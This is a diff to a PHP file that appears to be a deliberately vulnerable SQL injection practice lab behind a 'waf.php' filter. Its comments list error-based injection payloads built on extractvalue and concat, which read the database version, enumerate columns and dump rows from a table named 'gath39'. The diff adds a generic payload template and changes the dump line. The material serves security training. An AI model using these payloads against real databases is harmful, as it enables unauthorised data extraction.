@@ -7,6 +7,7 @@ include('waf.php');
 // Simple SQL injection in POST Method - in insert ( Error Based )
 
 // Query injection -------
+// 'and extractvalue(0,concat(0x3a, [QUERY])),'
 
 // GET VERSION 
 // 'and extractvalue(0,concat(0x3a, verion())),'
@@ -18,7 +19,7 @@ include('waf.php');
 // 'and extractvalue(0,concat(0x3a, (select column_name from information_schema.columns where table_name='gath39' limit 0,1))),'
 
 // DUMP DATA
-// (select first_name from billing_addresses limit 0,1)
+// 'and extractvalue(0,concat(0x3a,(select title from gath39 limit 0,1))),'
 
 // TEXT TUTORIAL
 // https://www.facebook.com/notes/verry-darmawan/error-based/2305245552873650/
